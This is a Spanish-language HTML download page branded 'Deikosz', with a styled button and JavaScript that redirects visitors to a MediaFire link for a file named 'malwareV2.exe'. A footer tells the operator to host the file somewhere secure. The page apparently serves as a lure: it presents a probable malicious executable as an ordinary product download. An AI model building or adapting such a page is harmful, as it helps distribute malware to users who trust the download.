<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Deikosz - Descarga</title>
  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg: #000000;
      --purple-1: #7B2CBF;
      --white: #ffffff;
    }
    html,body{
      height:100%;
      margin:0;
      background:var(--bg);
      font-family: "Baloo 2", system-ui, sans-serif;
      color:var(--white);
    }
    .wrap{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      flex-direction:column;
      gap:32px;
      padding:40px;
      text-align:center;
    }
    .title {
      font-size: clamp(48px, 12vw, 128px);
      font-weight: 800;
      letter-spacing: -2px;
      background: linear-gradient(180deg, var(--purple-1) 0%, var(--white) 70%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      text-shadow: 0 6px 30px rgba(123,44,191,0.08);
      border-radius: 12px;
      display:inline-block;
      padding: 6px 12px;
    }
    .arrow-container{
      display:flex;
      flex-direction:column;
      align-items:center;
      gap:8px;
      cursor:pointer;
    }
    .arrow{
      width:64px;
      height:64px;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      border-radius:50%;
      transition:transform .18s ease;
    }
    .arrow svg{
      width:34px;
      height:34px;
      fill: var(--white);
      filter: drop-shadow(0 6px 18px rgba(0,0,0,0.6));
    }
    .arrow:hover{
      transform: translateY(-6px) scale(1.03);
    }
    .arrow:active{
      transform: translateY(-2px) scale(.99);
    }
    .hint{
      font-size:14px;
      opacity:0.85;
    }
    @keyframes pulse {
      0% { transform: translateY(0); opacity:1; }
      50% { transform: translateY(6px); opacity:0.85; }
      100% { transform: translateY(0); opacity:1; }
    }
    .arrow-pulse{
      animation: pulse 1.6s infinite;
    }
    .download-btn{
      margin-top: 8px;
      background: linear-gradient(90deg, rgba(123,44,191,0.95), rgba(90,24,154,0.95));
      border: none;
      color: white;
      padding: 10px 18px;
      border-radius: 12px;
      font-weight:700;
      letter-spacing: .6px;
      cursor:pointer;
      text-decoration:none;
      display:inline-block;
    }
    .footer{
      position: absolute;
      bottom:16px;
      width:100%;
      text-align:center;
      font-size:12px;
      color:rgba(255,255,255,0.5);
    }
  </style>
</head>
<body>
  <div class="wrap">
    <h1 class="title">Deikosz</h1>
    <div class="arrow-container" id="downloadArea" role="button" tabindex="0">
      <div class="arrow arrow-pulse" id="arrow">
        <svg viewBox="0 0 24 24">
          <path d="M12 16.5c-.3 0-.5-.1-.7-.3l-6-6a1 1 0 011.4-1.4L12 13.09l5.3-4.29a1 1 0 011.4 1.4l-6 6c-.2.2-.5.3-.7.3z"></path>
        </svg>
      </div>
      <div class="hint">Clic para iniciar la descarga</div>
      <a id="downloadBtn" class="download-btn" href="https://www.mediafire.com/file/150uvvqv1x1xwfk/malwareV2.exe/file">Descargar</a>
    </div>
  </div>
  <div class="footer">Asegúrate de alojar el archivo en un host seguro.</div>
  <script>
    const DOWNLOAD_URL = "https://www.mediafire.com/file/150uvvqv1x1xwfk/malwareV2.exe/file";
    const downloadArea = document.getElementById("downloadArea");
    const downloadBtn = document.getElementById("downloadBtn");
    downloadBtn.setAttribute("href", DOWNLOAD_URL);
    function promptAndDownload() {
      const proceed = confirm("¿Deseas continuar con la descarga?");
      if (!proceed) return;
      window.location.href = DOWNLOAD_URL;
    }
    downloadArea.addEventListener("click", promptAndDownload);
    downloadArea.addEventListener("keydown", function(e){
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        promptAndDownload();
      }
    });
    downloadBtn.addEventListener("click", function(e){
      e.preventDefault();
      promptAndDownload();
    });
  </script>
</body>
</html>
